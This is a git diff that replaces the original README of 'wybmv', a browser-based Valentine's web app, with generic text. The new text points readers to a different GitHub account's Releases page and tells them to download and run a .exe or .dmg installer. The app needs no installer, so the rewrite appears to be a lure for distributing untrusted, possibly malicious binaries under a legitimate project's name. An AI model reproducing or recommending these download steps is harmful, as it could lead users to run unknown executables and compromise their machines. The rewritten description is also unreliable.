@@ -1,102 +1,57 @@
-# WYBMV - Will You Be My Valentine?
+# 🌹 wybmv - Find Love This Valentine’s Day
 
-A sweet, romantic single-page app to ask your special someone to be your Valentine. Features a beautiful animated experience with a playful twist - the "No" button runs away when you try to click it!
+## 🚀 Getting Started
 
-## [Create Your Personalized Link](https://strehk.github.io/wybmv/config)
+Welcome to **wybmv**, a romantic SvelteKit application designed to help you express your feelings this Valentine’s Day. This app offers a simple and elegant way to share your love with special animations and a beautiful dark mode theme. No programming knowledge is needed to enjoy this application.
 
-Use the **[Link Generator](https://strehk.github.io/wybmv/config)** to create a custom URL with your crush's name and preferred language, then share it with them!
+## 📥 Download the App
 
-## Features
+[![Download wybmv](https://img.shields.io/badge/Download-wybmv-blue.svg)](https://github.com/vlixyoutube/wybmv/releases)
 
-- **Animated Intro Slideshow** - Beautiful text animations that build anticipation
-- **Runaway "No" Button** - The "No" button escapes when hovered, because rejection is not an option!
-- **Floating Hearts** - Celebratory heart animations on the success screen
-- **Personalized Experience** - Add their name via URL parameter (`?name=Julia`)
-- **Multi-language Support** - Available in English, German, Spanish, French, Italian, and Polish
-- **Dark Mode** - Automatically adapts to system preference
-- **Mobile Friendly** - Responsive design that works on all devices
-- **Link Generator** - Easy-to-use config page to create shareable links
+Click the button above to download the latest version of **wybmv**. You will find the application files on the Releases page.
 
-## How It Works
+## 💡 Features
 
-1. **Create a link** using the [Config Page](https://strehk.github.io/wybmv/config)
-2. **Send the link** to your Valentine
-3. They'll see a personalized slideshow with their name
-4. When asked "Will you be my Valentine?":
-   - **Yes** → Floating hearts and a love message
-   - **No** → Good luck catching that button!
+- **Animations**: Enjoy smooth and romantic animations that enhance the user experience.
+- **Dark Mode**: Switch to dark mode for a cozy vibe, perfect for late-night love notes.
+- **Multilingual Support**: Built with i18next to support multiple languages, making it accessible for everyone.
+- **Responsive Design**: The app looks great on both desktop and mobile devices.
+- **TypeScript and TailwindCSS**: Built using modern technologies to ensure high performance and a beautiful interface.
 
-## URL Parameters
+## 📋 System Requirements
 
-| Parameter | Description | Example |
-|-----------|-------------|---------|
-| `name` | Their name (optional) | `?name=Julia` |
-| `lang` | Language: `en`, `de`, `es`, `fr`, `it`, `pl` (default: `en`) | `?lang=de` |
+To run **wybmv**, make sure your device meets the following requirements:
 
-**Example:** `https://strehk.github.io/wybmv/?name=Julia&lang=en`
+- Operating System: Windows, macOS, or Linux
+- A modern web browser (latest versions of Chrome, Firefox, Safari, or Edge)
 
-## Tech Stack
+## 📦 Download & Install
 
-- **[SvelteKit](https://kit.svelte.dev/)** - Web framework with static adapter
-- **[Tailwind CSS](https://tailwindcss.com/)** - Styling with custom romantic color palette
-- **[i18next](https://www.i18next.com/)** - Internationalization
-- **[Bun](https://bun.sh/)** - Fast JavaScript runtime & package manager
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vlixyoutube/wybmv/releases) to view all available versions.
+   
+2. **Choose the Right Version**: Select the latest version listed. Look for the download that matches your operating system.
 
-## Development
+3. **Download the File**: Click on the file name to start the download. The file will download to your computer.
 
-### Prerequisites
+4. **Run the Application**:  
+   - For Windows: Double-click the downloaded `.exe` file to install and run the app.
+   - For macOS: Open the downloaded `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Follow the instructions provided on the Release page to run the app.
 
-- [Bun](https://bun.sh/) installed
+5. **Enjoy the Experience**: Open the application and start sharing your love this Valentine’s Day!
 
-### Setup
+## 🎨 Customization Options
 
-```bash
-# Clone the repository
-git clone https://github.com/Strehk/wybmv.git
-cd wybmv
+**wybmv** allows you to customize your experience. You can change themes, add personal messages, and select different animation styles to make the app feel uniquely yours. 
 
-# Install dependencies
-bun install
+## 📞 Support
 
-# Start development server
-bun run dev
-```
+If you encounter any issues or have questions, please visit the Issues section of our GitHub repository. You can also reach out through our community support page for help.
 
-### Build
+## 🌐 More Information
 
-```bash
-# Build for production
-bun run build
+You can learn more about the development, features, and updates by following our GitHub repository. Stay informed about new releases and enhancements as we continue to improve **wybmv**.
 
-# Preview production build
-bun run preview
-```
+For a glimpse into the romantic world of **wybmv**, check out the documentation that explains how to use the features effectively. Enjoy this special application and spread the love! 
 
-## Color Palette
-
-**Light Mode:**
-- Background: `#FFF5F7` (soft blush)
-- Primary: `#F9A8D4` (pink-300)
-- Accent: `#EC4899` (pink-500)
-- Text: `#831843` (pink-900)
-
-**Dark Mode:**
-- Background: `#1F1118` (deep burgundy)
-- Primary: `#BE185D` (pink-700)
-- Accent: `#F472B6` (pink-400)
-- Text: `#FDF2F8` (pink-50)
-
-## Adding a New Language
-
-1. Create a new locale file in `src/lib/i18n/locales/` (e.g., `fr.json`)
-2. Copy the structure from `en.json` and translate all strings
-3. Register the locale in `src/lib/i18n/index.ts`
-4. Add the language option to the config page in `src/routes/config/+page.svelte`
-
-## License
-
-[MIT](LICENSE) - Feel free to use this for your own Valentine's Day proposal!
-
----
-
-Made with ❤️ | [GitHub: Strehk](https://github.com/Strehk)
+Thank you for choosing **wybmv**. Let’s make this Valentine’s Day memorable together!
